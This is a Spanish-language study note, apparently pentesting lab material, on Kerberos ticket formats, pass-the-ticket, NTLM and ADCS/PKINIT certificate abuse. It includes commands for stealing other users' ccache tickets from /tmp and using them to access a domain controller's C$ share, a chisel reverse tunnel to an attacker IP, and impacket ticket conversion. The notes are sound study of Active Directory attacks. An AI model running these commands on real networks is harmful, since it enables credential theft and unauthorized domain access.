...
---
## 1.6. Formato de los tickets
Los tickets de kerberos tienen un formato que varía entre sistemas. En Linux tienen al extensión `.ccache` mientras que en Windows son `.kirbi`.

#### Archivos kirbi
Ahora, según el formato podemos diferenciar el tipo de ticket:

| Tipo                  | Uso                                                                                | Ejemplo                                          |
| --------------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------ |
| `ST`                  | Permite el acceso de su usuario a un servicio (`@servicio`) del AD                 | `[0;XXX]-X-X-XXX-MS01@cifs-DC01.web.local.kirbi` |
| `TGT`                 | Permite autenticarse en nombre del usuario a cualquier servicio (`@krbtgt`) del AD | `[0;XXX]-X-X-XXX-belen@krbtgt.web.local.kirbi`   |
| Tickets de la máquina | Tickets para que la máquina se autentique                                          | `[0;XXX]-X-X-XXX-MS01@krbtgt.web.local.kirbi`    |

Estos tickets se importan automáticamente y se pueden realizar comandos en nombre del usuario si es un `TGT` como `dir \\DC01.web.local\john\`

--------
#### Archivos ccache
En Linux, los tickets están en formato `.ccache` o sin formato, pero con el nombre `krb5cc_<numero>_<cadena>` bajo el directorio `/tmp`
```bash
MS01$: ls -la /tmp
# -rw-------  1 julio@web.local       domain users@web.local 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
# -rw-------  1 david@web.local       domain david@web.local 1406 Oct  7 11:35 krb5cc_647401107_O0oUWh
# -rw-------  1 svc_work@web.local    domain users@web.local 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF

MS01$: id david@web.local
# Podemos ver a qué grupos pertenece cada uno
# uid=647401106(julio@inlanefreight.htb) ... 647400512(domain admins@inlanefreight.htb)
```

Por tanto podemos guardar estos tickets en memoria y usarlos para autenticarnos por kerberos con las herramientas. Esto lo tenemos que hacer en la máquina que está conectada al dominio. 
```bash
MS01$: export KRB5CCNAME=$(pwd)/krb5cc_647401106_HRJDux
MS01$: klist
# Ticket cache: FILE:/root/krb5cc_647401106_HRJDux 
# Default principal: julio@INLANEFREIGHT.HTB 
# Valid starting      Expires             Service principal
# 10/07/2022 13:25:01 10/07/2022 23:25:01 krbtgt/web.local@web.local renew until 10/08/2022 13:25:01
MS01$: smbclient //dc01/C$ -k -c ls -no-pass
```

Si se hace desde kali, se debe establecer un tunel con proxychains para que no falle la resolución de nombres.
```bash
KALI$: sudo ./chisel server --reverse
MS01$: chisel client 10.10.14.33:8080 R:socks
```

Además podemos convertir los formatos con impacket:
```bash
impacket-ticketConverter krb5cc_647401106_HRJDux julio.kirbi
```



## 1.7. 🎭 Delegación en Kerberos
...
----
## 1.8. 🔑 NTLM: la alternativa a Kerberos
...
## 1.9. 🔑 ADCS - PKINIT
> [!NOTE]
> Es una extensión del protocolo Kerberos que permite hacer la **autenticación inicial** (el AS-REQ/AS-REP, el intercambio que te da el TGT) usando **certificados digitales / clave pública**, en lugar de (o además de) la contraseña del usuario. En AD esto se apoya en **AD CS (Active Directory Certificate Services)** y es la base de mecanismos como smart cards, Windows Hello for Business, y autenticación sin contraseña.

1. `AS-REQ`. El cliente le manda al servidor el certificado del usuario y la firma digital (con su clave privada).
2. Luego el `KDC` verifica la firma contra la clave pública del certificado (y la cadena de confianza CA). 
3. `AS-REP` Si todo es correcto devuelve el `TGT`, dónde la sesión key va cifrada o con la clave pública del cliente (`PKINIT-RSA`) o con Diffie-Hellman (`PKINIT-DH`, más seguro)

El KDC tiene su propio certificado (`KDC certificate`) para que el cliente pueda confiar en él

> [!CAUTION]
> Si se compromete un certificado válido de un usuario, se puede obtener el TGT y extraer el hash NTLM del usuario. Este es el ataque `UnPAC the hash`. Ya que el `TGT` sigue teniendo el `PAC_CREDENTIAL_INFO` con el hash dentro.

Normalmente hay una ruta `HTTP` para pedir certificados en nombre de nuestro usuario.

-----
#### Certificate Templates
Son el "molde" que define cómo se emite un certificado dentro de AD-CS. En lugar de que la CA (Certificate Authority) configure cada certificado a mano, usas plantillas que especifican: para qué sirve el certificado, quién puede solicitarlo, y qué contiene.

Se gestionan desde la consola `certtmpl.msc` o `certsrv.msc`, y viven como objetos en el contenedor de configuración de AD:
```
...
| Campo                                           | Qué controla                                                                                                                                         |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Subject Name**                                | Determina a nombre de quien se puede pedir el certificado                                                                                            |
| **Extended Key Usage (EKU)**                    | Para qué se puede usar: `Client Authentication`, `Smart Card Logon`, `Server Authentication`, etc. Esto determina si sirve para autenticación PKINIT |
| **Permisos de inscripción (Enroll/AutoEnroll)** | Determina quien puede pedir un certificado                                                                                                           |
| **Requisitos de aprobación**                    | Si necesita firma de un manager/CA officer o se emite automáticamente                                                                                |
| **Validez y renovación**                        | Cuánto dura, si se auto-renueva                                                                                                                      |
| **Algoritmo criptográfico y longitud de clave** | RSA/ECC, 2048/4096 bits, etc.                                                                                                                        |

> [!CAUTION]
> Las plantillas son la superficie de configuración más importante de AD CS a revisar, porque una mal configurada puede permitir que un usuario de bajo privilegio obtenga un certificado que le sirva para autenticarse **como otra cuenta** (incluyendo cuentas privilegiadas), vía PKINIT 
